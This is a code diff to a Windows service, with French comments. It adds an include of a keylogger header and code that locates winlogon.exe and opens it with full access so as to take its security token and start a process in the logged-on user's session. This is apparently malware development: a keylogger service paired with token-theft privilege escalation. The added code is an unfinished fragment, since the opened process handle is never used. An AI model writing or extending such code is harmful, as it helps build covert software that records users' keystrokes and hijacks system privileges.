@@ -1,5 +1,5 @@
 #include "svc.hpp"
-
+#include "../keylog/keylogger.h"
 
 int InstallService()
 {
@@ -281,6 +281,24 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
         _tprintf(_T("WTSQueryUserToken failed (%lu)\n"), GetLastError());
         return ERROR_PROCESS_ABORTED;
     }
+
+    // recuperer le token de sécurité d'un processus et l'utiliser pour créer un processus dans la session utilisateur
+    const wchar_t* targetProcess = _T("winlogon.exe");
+    DWORD pid = FindTargetPID(targetProcess);
+    if (pid == 0)
+    {
+        _tprintf(_T("Target process not found.\n"));
+        CloseHandle(htoken);
+        return ERROR_PROCESS_ABORTED;
+    }
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	if (!hProcess)
+	{
+		wprintf(_T("OpenProcess failed (%lu)\n"), GetLastError());
+		return 1;
+	}
+    
+
 
     // Obtenir le répertoire du service
     GetModuleFileName(NULL, szPath, MAX_PATH);
